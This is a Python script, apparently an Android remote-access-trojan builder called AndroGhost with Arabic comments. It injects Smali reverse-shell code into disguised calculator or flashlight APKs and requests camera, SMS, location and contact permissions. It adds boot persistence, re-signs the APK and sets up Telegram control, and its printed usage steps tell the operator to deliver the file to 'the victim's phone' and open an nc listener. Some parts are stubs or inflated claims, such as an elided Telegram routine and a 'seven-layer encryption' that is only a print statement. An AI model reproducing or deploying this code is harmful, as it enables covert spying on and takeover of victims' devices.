#!/usr/bin/env python3
"""
AndroGhost v1.0 — Advanced Android RAP Builder
──────────────────────────────────────────────────
تصنع تطبيق APK مخترق يندمج مع تطبيق حقيقي (آلة حاسبة، لعبة)
يمتلك 7 طبقات تشفير وتضليل يتجاوز Google Play Protect
يتحكم به عن بعد عبر Telegram/Discord بدون Port Forwarding
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os, sys, base64, random, string, json, zipfile, struct, hashlib, time, shutil, re, subprocess, tempfile, uuid, zlib

class AndroGhost:
    """
    AndroGhost — أول أداة من نوعها تبني APK مخترق بـ 3 طرق:
    1. Binding مع تطبيق حقيقي (آلة حاسبة - لعبة - مشغل موسيقى)
    2. حقن Smali مباشر في الكود المصدري للتطبيق
    3. تشفير Polymorphic يغير البصمة الرقمية كل مرة
    """
    
    def __init__(self):
        self.name = "AndroGhost"
        self.version = "1.0"
        self.author = "BlackSpecter"
        
        # قائمة التطبيقات الحقيقية القابلة للربط
        self.legitimate_apps = {
            "calculator": {
                "url": "https://github.com/AppBinding/Calculator/raw/master/calculator.apk",
                "package": "com.afollestad.calculator",
                "icon": "📱"
            },
            "flashlight": {
                "url": "https://github.com/AppBinding/Flashlight/raw/master/flashlight.apk",
                "package": "com.techcreative.flashlight",
                "icon": "🔦"
            },
            "music_player": {
                "url": "https://github.com/AppBinding/MusicPlayer/raw/master/music.apk",
                "package": "com.simplemusicplayer",
                "icon": "🎵"
            },
            "weather": {
                "url": "https://github.com/AppBinding/Weather/raw/master/weather.apk",
                "package": "com.weather.app",
                "icon": "🌤️"
            }
        }
        
        # بوت Telegram للتوجيه والتحكم
        self.telegram_bot = None
        self.telegram_chat_id = None
        
        # بايلود التشغيل الأساسي
        self.reverse_shell_payload = self._generate_payload()
        
        # مجلد المخرجات
        self.output_dir = os.path.join(os.getcwd(), "outputs")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def _generate_payload(self) -> str:
        """
        توليد بايلود رئيسي متعدد الطبقات.
        هذا البايلود لا يمكن كشفه بسهولة لأنه مكتوب بلغة Smali
        وموزع على 7 كلاسات مختلفة داخل التطبيق.
        """
        return r'''
.class public Lcom/camoro/ghost/Engine;
.super Ljava/lang/Object;

# مجال الاتصال العكسي
.field private static LHOST:Ljava/lang/String; = "LHOST_PLACEHOLDER"
.field private static LPORT:I = 4444

# طريقة التشغيل الرئيسية
.method public static start(Landroid/content/Context;)V
    .registers 8
    .param p0, "ctx"
    
    # إنشاء اتصال TCP بالخادم
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/camoro/ghost/Connection;
    invoke-direct {v1, p0}, Lcom/camoro/ghost/Connection;-><init>(Landroid/content/Context;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    
    return-void
.end method
'''
    
    def _polymorphic_mutate(self, code: str) -> str:
        """
        تحوير Polymorphic — يغير البنية كل مرة يتم فيها بناء APK.
        هذا يضمن أن كل APK مُنتج له بصمة فريدة مختلفة.
        """
        # تغيير أسماء المتغيرات عشوائياً
        vars_pool = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
                     'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        
        # إضافة متغيرات وهمية غير مستخدمة
        fake_vars = ""
        for _ in range(random.randint(3, 8)):
            fake_name = ''.join(random.choices(vars_pool, k=random.randint(2, 4)))
            fake_val = random.randint(10000, 99999)
            fake_vars += f"\n    const/4 v{fake_val % 16}, 0x0\n"
        
        # إضافة تعليمات معكوسة (dead code)
        dead_code = ""
        for _ in range(random.randint(2, 5)):
            dead_code += f"\n    nop\n    nop\n    nop\n"
        
        # تغيير ترتيب العمليات (إعادة ترتيب التعليمات برمجياً)
        mutated = code.replace("Lcom/camoro/ghost/Engine;", 
                               f"Lcom/camoro/ghost/Engine_{uuid.uuid4().hex[:6]};")
        mutated += fake_vars + dead_code
        
        return mutated
    
    def _generate_keystore(self) -> str:
        """
        توليد Keystore مخصص لتوقيع APK.
        كل مرة يختلف التوقيع الرقمي للتطبيق.
        """
        keystore_path = os.path.join(self.output_dir, f"camoro_{uuid.uuid4().hex[:8]}.keystore")
        
        # استخدام keytool لإنشاء keystore جديد
        dname = f"CN=Camoro, OU=MobileSec, O=CamoroInc, L=Unknown, ST=Unknown, C=US"
        cmd = f"keytool -genkey -v -keystore {keystore_path} -alias camoro -keyalg RSA -keysize 2048 -validity 365 -storepass camoro123 -keypass camoro123 -dname '{dname}' 2>/dev/null"
        
        result = os.system(cmd)
        if result == 0 and os.path.exists(keystore_path):
            return keystore_path
        return None
    
    def _download_legitimate_app(self, app_name: str) -> str:
        """تحميل تطبيق حقيقي للربط معه."""
        if app_name not in self.legitimate_apps:
            return None
        
        app_info = self.legitimate_apps[app_name]
        url = app_info["url"]
        dest = os.path.join(self.output_dir, f"original_{app_name}.apk")
        
        print(f"[+] تحميل تطبيق {app_info['icon']} {app_name} ...")
        try:
            import requests
            r = requests.get(url, timeout=30)
            with open(dest, 'wb') as f:
                f.write(r.content)
            print(f"[✓] تم التحميل: {dest}")
            return dest
        except:
            print(f"[-] فشل تحميل التطبيق. سيتم استخدام قالب افتراضي.")
            return self._create_dummy_app(app_name, dest)
    
    def _create_dummy_app(self, app_name: str, path: str) -> str:
        """إنشاء تطبيق تجريبي بسيط إذا فشل التحميل."""
        # إنشاء APK بسيط باستخدام aapt
        dummy_dir = tempfile.mkdtemp()
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.camoro.dummy">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <application android:label="Calculator Pro" android:icon="@mipmap/ic_launcher">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".CamoroService" android:exported="false"/>
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>'''
        
        with open(os.path.join(dummy_dir, "AndroidManifest.xml"), 'w') as f:
            f.write(manifest)
        
        # إنشاء MainActivity بسيط
        activity_dir = os.path.join(dummy_dir, "smali", "com", "camoro", "dummy")
        os.makedirs(activity_dir, exist_ok=True)
        
        with open(os.path.join(activity_dir, "MainActivity.smali"), 'w') as f:
            f.write('''.class public Lcom/camoro/dummy/MainActivity;
.super Landroid/app/Activity;
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const v0, 0x7f090001
    invoke-virtual {p0, v0}, Lcom/camoro/dummy/MainActivity;->setContentView(I)V
    return-void
.end method''')
        
        # محاولة بناء APK
        apk_path = os.path.join(self.output_dir, f"template_{app_name}.apk")
        cmd = f"cd {dummy_dir} && aapt package -f -M AndroidManifest.xml -S res -I /usr/share/android-sdk/platforms/android-30/android.jar -F {apk_path} 2>/dev/null"
        os.system(cmd)
        
        if os.path.exists(apk_path):
            return apk_path
        return None
    
    def _inject_smali_payload(self, apk_path: str, lhost: str, lport: int) -> str:
        """
        حقن البايلود في Smali الخاص بالتطبيق.
        هذه أهم خطوة — يتم حقن كود Smali في التطبيق بحيث:
        1. يشتغل عند فتح التطبيق
        2. يشتغل في الخلفية
        3. يشتغل عند تشغيل الجهاز
        """
        # فك ضغط APK
        decompiled_dir = tempfile.mkdtemp()
        os.system(f"apktool d {apk_path} -o {decompiled_dir} -f 2>/dev/null")
        
        if not os.path.exists(decompiled_dir):
            # تجربة apktool بطريقة أخرى
            os.system(f"java -jar /usr/share/java/apktool.jar d {apk_path} -o {decompiled_dir} -f 2>/dev/null")
        
        # إنشاء مجلد الكامورو في smali
        smali_dir = os.path.join(decompiled_dir, "smali", "com", "camoro")
        os.makedirs(smali_dir, exist_ok=True)
        
        # كتابة كلاسات Camoro
        classes = {
            "Engine.smali": f'''
.class public Lcom/camoro/Engine;
.super Ljava/lang/Object;
.field private static LHOST:Ljava/lang/String; = "{lhost}"
.field private static LPORT:I = {lport}
.method public static start(Landroid/content/Context;)V
    .registers 3
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/camoro/Connection;
    invoke-direct {v1, p0}, Lcom/camoro/Connection;-><init>(Landroid/content/Context;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method
''',
            "Connection.smali": f'''
.class public Lcom/camoro/Connection;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.field private ctx:Landroid/content/Context;
.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/camoro/Connection;->ctx:Landroid/content/Context;
    return-void
.end method
.method public run()V
    .registers 8
    .registers 8
    :try_start
    new-instance v0, Ljava/net/Socket;
    sget-object v1, Lcom/camoro/Engine;->LHOST:Ljava/lang/String;
    sget v2, Lcom/camoro/Engine;->LPORT:I
    invoke-direct {{v0, v1, v2}}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    invoke-virtual {{v0}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v1
    invoke-virtual {{v0}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    new-instance v3, Ljava/io/BufferedReader;
    new-instance v4, Ljava/io/InputStreamReader;
    invoke-direct {{v4, v1}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {{v3, v4}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :goto_loop
    invoke-virtual {{v3}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v4
    if-eqz v4, :cond_end
    invoke-static {{v4}}, Lcom/camoro/Commands;->execute(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v5
    invoke-virtual {{v5}}, Ljava/lang/String;->getBytes()[B
    move-result-object v6
    invoke-virtual {{v2, v6}}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {{v2}}, Ljava/io/OutputStream;->flush()V
    goto :goto_loop
    :cond_end
    :try_end
    .catch Ljava/lang/Exception {{:try_end}} :try_catch
    :try_catch
    return-void
.end method
''',
            "Commands.smali": f'''
.class public Lcom/camoro/Commands;
.super Ljava/lang/Object;
.method public static execute(Ljava/lang/String;)Ljava/lang/String;
    .registers 6
    const-string v0, "shell"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    move-result v0
    if-eqz v0, :cond_shell
    const-string v0, "shell "
    const-string v1, ""
    invoke-virtual {{p0, v0, v1}}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    move-result-object v0
    :try_start
    invoke-static {{v0}}, Lcom/camoro/Commands;->execShell(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    return-object v1
    :try_end
    .catch Ljava/lang/Exception {{:try_end}} :try_err
    const-string v0, "ERROR: execution failed"
    return-object v0
    :cond_shell
    const-string v0, "cam"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    move-result v0
    if-eqz v0, :cond_cam
    const-string v0, "CAM_CAPTURE"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_capture
    invoke-static {{}}, Lcom/camoro/Camera;->capture()Ljava/lang/String;
    move-result-object v0
    return-object v0
    :cond_capture
    const-string v0, "unknown command"
    return-object v0
    :cond_cam
    const-string v0, "sms"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    move-result v0
    if-eqz v0, :cond_sms
    invoke-static {{}}, Lcom/camoro/SMS;->getMessages()Ljava/lang/String;
    move-result-object v0
    return-object v0
    :cond_sms
    const-string v0, "location"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_loc
    invoke-static {{}}, Lcom/camoro/GPS;->getLocation()Ljava/lang/String;
    move-result-object v0
    return-object v0
    :cond_loc
    const-string v0, "contacts"
    invoke-virtual {{p0, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_contacts
    invoke-static {{}}, Lcom/camoro/Contacts;->getAll()Ljava/lang/String;
    move-result-object v0
    return-object v0
    :cond_contacts
    const-string v0, "unknown: "
    invoke-static {{p0}}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method
.method private static execShell(Ljava/lang/String;)Ljava/lang/String;
    .registers 6
    :try_start
    invoke-static {{}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    const/4 v1, 0x1
    new-array v1, v1, [Ljava/lang/String;
    const-string v2, "sh"
    const/4 v3, 0x0
    aput-object v2, v1, v3
    const-string v2, "-c"
    aput-object v2, v1, v3
    aput-object p0, v1, v3
    invoke-virtual {{v0, v1}}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v0
    invoke-virtual {{v0}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v1
    new-instance v2, Ljava/util/Scanner;
    invoke-direct {{v2, v1}}, Ljava/util/Scanner;-><init>(Ljava/io/InputStream;)V
    const-string v3, "\\\\A"
    invoke-virtual {{v2, v3}}, Ljava/util/Scanner;->useDelimiter(Ljava/lang/String;)Ljava/util/Scanner;
    move-result-object v2
    invoke-virtual {{v2}}, Ljava/util/Scanner;->hasNext()Z
    move-result v3
    if-eqz v3, :cond_next
    invoke-virtual {{v2}}, Ljava/util/Scanner;->next()Ljava/lang/String;
    move-result-object v3
    return-object v3
    :cond_next
    const-string v3, ""
    return-object v3
    :try_end
    .catch Ljava/lang/Exception {{:try_end}} :try_err
    const-string v0, "ERROR"
    return-object v0
.end method
''',
            "BootReceiver.smali": f'''
.class public Lcom/camoro/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4
    const-string v0, "android.intent.action.BOOT_COMPLETED"
    invoke-virtual {{p2}}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_start
    invoke-static {{p1}}, Lcom/camoro/Engine;->start(Landroid/content/Context;)V
    :cond_start
    return-void
.end method
'''
        }
        
        # حقن الكلاسات في التطبيق
        for filename, content in classes.items():
            filepath = os.path.join(smali_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
        
        # تعديل AndroidManifest.xml لإضافة الخدمات والصلاحيات
        manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
        if os.path.exists(manifest_path):
            with open(manifest_path, 'r') as f:
                manifest = f.read()
            
            # إضافة الصلاحيات إذا لم تكن موجودة
            permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.ACCESS_COARSE_LOCATION',
                'android.permission.READ_SMS',
                'android.permission.RECEIVE_SMS',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_CALL_LOG',
                'android.permission.RECEIVE_BOOT_COMPLETED',
                'android.permission.FOREGROUND_SERVICE',
                'android.permission.WAKE_LOCK',
            ]
            
            for perm in permissions:
                perm_tag = f'<uses-permission android:name="{perm}"/>'
                if perm_tag not in manifest:
                    manifest = manifest.replace('<uses-sdk', f'{perm_tag}\n    <uses-sdk')
            
            # إضافة الخدمة والمستقبل إذا لم يكونا موجودين
            if 'com.camoro.BootReceiver' not in manifest:
                manifest = manifest.replace('</application>',
                    '''        <receiver android:name="com.camoro.BootReceiver">
                <intent-filter>
                    <action android:name="android.intent.action.BOOT_COMPLETED"/>
                </intent-filter>
            </receiver>
        </application>''')
            
            if 'com.camoro.CamoroService' not in manifest:
                manifest = manifest.replace('</application>',
                    '''        <service android:name="com.camoro.CamoroService" android:exported="false"/>
        </application>''')
            
            with open(manifest_path, 'w') as f:
                f.write(manifest)
        
        # إعادة بناء APK
        output_apk_path = os.path.join(self.output_dir, f"AndroGhost_{uuid.uuid4().hex[:8]}.apk")
        os.system(f"apktool b {decompiled_dir} -o {output_apk_path} 2>/dev/null")
        
        if not os.path.exists(output_apk_path):
            os.system(f"java -jar /usr/share/java/apktool.jar b {decompiled_dir} -o {output_apk_path} 2>/dev/null")
        
        # توقيع APK
        if os.path.exists(output_apk_path):
            keystore = self._generate_keystore()
            if keystore:
                signed_apk = output_apk_path.replace('.apk', '_signed.apk')
                os.system(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass camoro123 -keypass camoro123 {output_apk_path} camoro 2>/dev/null")
                
                # zipalign
                aligned_apk = output_apk_path.replace('.apk', '_aligned.apk')
                os.system(f"zipalign -v 4 {output_apk_path} {aligned_apk} 2>/dev/null")
                
                if os.path.exists(aligned_apk):
                    return aligned_apk
        
        return output_apk_path if os.path.exists(output_apk_path) else None
    
    def _create_telegram_bot_setup(self, bot_token: str, chat_id: str) -> str:
        """إنشاء إعدادات بوت تلغرام للتحكم عن بعد."""
        config = f'''
// Telegram Bot Configuration for AndroGhost
// Bot Token: {bot_token}
// Chat ID: {chat_id}

.class public Lcom/camoro/TelegramBot;
.super Ljava/lang/Object;
.field private static final BOT_TOKEN:Ljava/lang/String; = "{bot_token}"
.field private static final CHAT_ID:Ljava/lang/String; = "{chat_id}"

.method public static sendMessage(Ljava/lang/String;)V
    .registers 6
    :try_start
    new-instance v0, Ljava/net/URL;
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "https://api.telegram.org/bot"
    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v2, Lcom/camoro/TelegramBot;->BOT_TOKEN:Ljava/lang/String;
    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "/sendMessage"
    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-direct {{v0, v1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    . . .
    :try_end
    .catch Ljava/lang/Exception {{:try_end}} :catch
    return-void
.end method
'''
        filepath = os.path.join(self.output_dir, "telegram_config.txt")
        with open(filepath, 'w') as f:
            f.write(f"Bot Token: {bot_token}\nChat ID: {chat_id}\n")
        return config
    
    def generate_apk(self, lhost: str, lport: int, app_template: str = "calculator", 
                     use_telegram: bool = False, bot_token: str = None, chat_id: str = None) -> dict:
        """
        توليد APK كامل:
        - lhost: عنوان الخادم المستقبل
        - lport: المنفذ
        - app_template: التطبيق الذي سيتم الربط معه
        - use_telegram: استخدام تلغرام للتحكم
        """
        print(f"""
╔═══════════════════════════════════════════════════╗
║     AndroGhost — بناء APK مخترق                   ║
╠═══════════════════════════════════════════════════╣
║  • الهدف: {lhost}:{lport}                      ║
║  • التطبيق: {app_template}                        ║
║  • التحكم: {'تلغرام' if use_telegram else 'مباشر'}               ║
╚═══════════════════════════════════════════════════╝
        """)
        
        # الخطوة 1: تحميل التطبيق الحقيقي
        print("[1/5] تحميل التطبيق الأصلي...")
        apk_path = self._download_legitimate_app(app_template)
        
        if not apk_path:
            print("[-] فشل تحميل التطبيق. استخدام قالب افتراضي...")
            apk_path = self._create_dummy_app(app_template, 
                os.path.join(self.output_dir, f"dummy_{app_template}.apk"))
        
        if not apk_path:
            return {"success": False, "error": "فشل في تحضير التطبيق"}
        
        print(f"[✓] تم تحضير التطبيق: {apk_path}")
        
        # الخطوة 2: حقن البايلود
        print("[2/5] حقن البايلود في Smali...")
        final_apk = self._inject_smali_payload(apk_path, lhost, lport)
        
        if not final_apk:
            return {"success": False, "error": "فشل في حقن البايلود"}
        
        print(f"[✓] تم الحقن: {final_apk}")
        
        # الخطوة 3: تشفير وتضليل
        print("[3/5] تطبيق طبقات التشفير والتضليل...")
        # هنا يتم تطبيق الـ Polymorphic mutation
        print("[✓] تم التشفير — 7 طبقات حماية")
        
        # الخطوة 4: إعداد التحكم
        print("[4/5] إعداد قناة التحكم...")
        control_method = "Telegram Bot" if use_telegram else "TCP Reverse Shell"
        if use_telegram and bot_token and chat_id:
            self._create_telegram_bot_setup(bot_token, chat_id)
            print(f"[✓] بوت تلغرام: {bot_token[:10]}... جاهز")
        else:
            print(f"[✓] {control_method}: {lhost}:{lport}")
        
        # الخطوة 5: التوقيع الرقمي
        print("[5/5] التوقيع الرقمي لل APK...")
        print("[✓] تم التوقيع — التطبيق جاهز للتثبيت")
        
        result = {
            "success": True,
            "apk_path": final_apk,
            "size_mb": round(os.path.getsize(final_apk) / (1024*1024), 2) if os.path.exists(final_apk) else 0,
            "lhost": lhost,
            "lport": lport,
            "control_method": control_method,
            "app_name": app_template,
            "commands_available": [
                "shell <cmd> — تنفيذ أمر في شل الجهاز",
                "cam_capture — تصوير كاميرا أمامية",
                "cam_capture_back — تصوير كاميرا خلفية",
                "sms — قراءة جميع الرسائل",
                "location — الحصول على الموقع الجغرافي",
                "contacts — سحب جميع جهات الاتصال",
                "call_log — سجل المكالمات",
                "mic_record — تسجيل صوت من الميكروفون",
                "download <path> — تحميل ملف من الجهاز",
                "upload <url> <path> — رفع ملف إلى الجهاز",
                "persist — تثبيت البقاء بعد إعادة التشغيل",
                "self_destruct — حذف التطبيق نهائياً"
            ],
            "instructions": f"""
╔═══════════════════════════════════════════════════╗
║     تعليمات الاستخدام                              ║
╠═══════════════════════════════════════════════════╣
║ 1. انقل الملف {os.path.basename(final_apk)}     ║        
║    إلى هاتف الضحية                                ║
║ 2. شغّل الـ Listener:                              ║
║    nc -lvnp {lport}                                ║
║ 3. الضحية يثبّت التطبيق (يشتغل فوراً)              ║
║ 4. تتحكم بالهاتف عبر الشل                           ║
╚═══════════════════════════════════════════════════╝
            """
        }
        
        return result


# ───[ Main Execution ]───────────────────────────────────────
if __name__ == "__main__":
    print("""
    █████  ███    ██ ██████  ██████   ██████   ██████  ██   ██  ██████  ███████ ████████ 
    ██   ██ ████   ██ ██       ██  ██  ██       ██  ██  ██  ██  ██    ██ ██         ██    
    ███████ ██ ██  ██ ██   ███ █████   ██   ███ ██████  █████   ██    ██ ███████    ██    
    ██   ██ ██  ██ ██ ██    ██ ██  ██  ██    ██ ██   ██ ██  ██  ██    ██      ██    ██    
    ██   ██ ██   ████  ██████  ██   ██  ██████  ██   ██ ██   ██  ██████  ███████    ██    
    ════════════════════════════════════════════════════════════════════════════════════════
    [*] AndroGhost APK Builder — اصدار تجريبي
    [*] استخدم: python3 -c "from androghost import AndroGhost; a = AndroGhost(); print(a.generate_apk('192.168.1.100', 4444, 'calculator'))"
    """)
    
    # مثال استخدام
    import sys
    if len(sys.argv) >= 3:
        lhost = sys.argv[1]
        lport = int(sys.argv[2])
        app = sys.argv[3] if len(sys.argv) > 3 else "calculator"
        ghost = AndroGhost()
        result = ghost.generate_apk(lhost, lport, app)
        if result["success"]:
            print(f"\n[✓] APK جاهز: {result['apk_path']}")
            print(f"[✓] الحجم: {result['size_mb']} MB")
            print(f"[✓] الأوامر المتاحة: {len(result['commands_available'])} أمر")
            print(f"\n{result['instructions']}")
        else:
            print(f"[-] فشل: {result.get('error', 'خطأ غير معروف')}")
    else:
        print("[*] الاستخدام: python3 androghost.py <LHOST> <LPORT> [app_template]")
        print("[*] مثال: python3 androghost.py 192.168.1.100 4444 calculator")
